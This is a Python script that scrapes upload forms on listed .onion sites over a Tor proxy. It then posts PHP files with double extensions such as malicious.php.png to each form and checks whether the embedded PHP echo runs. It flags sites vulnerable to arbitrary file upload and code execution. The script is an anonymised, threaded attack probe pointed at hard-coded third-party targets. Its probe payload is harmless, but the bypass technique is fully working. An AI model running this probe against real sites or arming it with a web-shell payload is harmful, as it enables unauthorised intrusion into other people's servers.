import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import threading
import json
import os
from tqdm import tqdm

class FileUploadValidator:
    def __init__(self, onion_urls):
        self.onion_urls = onion_urls
        self.tor_proxy = "socks5h://127.0.0.1:9050"
        self.session = requests.Session()
        self.session.proxies = {
            'http': self.tor_proxy,
            'https': self.tor_proxy
        }
        self.results = {}

    def get_file_upload_form(self, onion_url):
        try:
            response = self.session.get(onion_url)
            response.raise_for_status()
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = soup.find_all('form')

            for form in forms:
                input_type = form.find('input', {'type': 'file'})
                if input_type:
                    input_name = input_type.get('name', 'file')
                    allowed_file_types = input_type.get('accept', '').split(',')

                    select_field = form.find('select', {'name': 'fileType'})
                    if select_field:
                        selected_option = select_field.find('option', {'selected': True})
                        if selected_option:
                            selected_mime_type = selected_option.get('value', '')
                            if selected_mime_type:
                                allowed_file_types.append(selected_mime_type)
                            
                    yield (form, input_name, allowed_file_types)
                
        except requests.exceptions.RequestException as e:
            self.results[onion_url] = {
                "Results": "The URL is not accessible through Tor."
            }

    def test_file_upload(self, onion_url, form, input_name, allowed_file_types):
        try:
            action = form.get('action')
            if not action:
                return
            
            malicious_files = [
                ("malicious.php.png", "<?php echo 'VULNERABLE'; ?>"),
                ("malicious.php.txt", "<?php echo 'VULNERABLE'; ?>"),
                ("malicious.php", "<?php echo 'VULNERABLE'; ?>"),
                ("malicious.php.jpg", "<?php echo 'VULNERABLE'; ?>"),
                ("malicious.php.jpeg", "<?php echo 'VULNERABLE'; ?>"),
                ("malicious.php.gif", "<?php echo 'VULNERABLE'; ?>"),
                ("malicious.php.bmp", "<?php echo 'VULNERABLE'; ?>"),
                ("malicious.php.zip", "<?php echo 'VULNERABLE'; ?>"),
                ("malicious.php.tar.gz", "<?php echo 'VULNERABLE'; ?>"),
                ("malicious.php.rar", "<?php echo 'VULNERABLE'; ?>"),
                ("malicious.php.pdf", "<?php echo 'VULNERABLE'; ?>"),
                ("malicious.php.docx", "<?php echo 'VULNERABLE'; ?>"),
                ("malicious.php.xlsx", "<?php echo 'VULNERABLE'; ?>"),
                ("malicious.php.pptx", "<?php echo 'VULNERABLE'; ?>")
            ]

            for file_name, content in tqdm(malicious_files, desc="Scanning URLs to insert malicious files", unit="file"):
                with open(file_name, "w") as malicious_file:
                    malicious_file.write(content)

                files = {input_name: open(file_name, 'rb')}
                res = self.session.post(urljoin(onion_url, action), files=files,
                                        proxies=self.session.proxies, allow_redirects=True)

                os.remove(file_name)

                if 'VULNERABLE' in res.text:
                    if onion_url not in self.results:
                        self.results[onion_url] = {}
                    if input_name not in self.results[onion_url]:
                        self.results[onion_url][input_name] = []

                    uploaded_extension = os.path.splitext(file_name)[1]

                    allowed_file_types.append(uploaded_extension)

                    self.results[onion_url][input_name].append(f"Accepts files with: {os.path.splitext(file_name)[1]} extension")
                else:
                    if onion_url not in self.results:
                        self.results[onion_url] = {}
                    if input_name not in self.results[onion_url]:
                        self.results[onion_url][input_name] = []

                    self.results[onion_url][input_name].append(f"NO VULNERABLE: {file_name}")
        except requests.exceptions.RequestException as e:
            if onion_url not in self.results:
                self.results[onion_url] = {}
            self.results[onion_url] = {
                "Results": "Error obtaining the form."
            }

    def run_tests(self):
        for onion_url in self.onion_urls:
            try:
                file_upload_forms = list(self.get_file_upload_form(onion_url))
                total_forms = len(file_upload_forms)
                if total_forms == 0:
                    self.results[onion_url] = {
                        "Results": "No upload forms found, maybe the URL is not accessible through Tor."
                    }
                else:
                    threads = []
                    for form, input_name, allowed_file_types in file_upload_forms:
                        thread = threading.Thread(target=self.test_file_upload,
                                                  args=(onion_url, form, input_name, allowed_file_types))
                        threads.append(thread)
                        thread.start()
                    for thread in threads:
                        thread.join()

            except Exception as e:
                self.results[onion_url] = {
                    "Results": f"Error processing URL."
                }

if __name__ == "__main__":
    onion_urls = [
        "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests", "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_file/", "a"
    ]
    validator = FileUploadValidator(onion_urls)
    validator.run_tests()
    print(json.dumps(validator.results, indent=4))
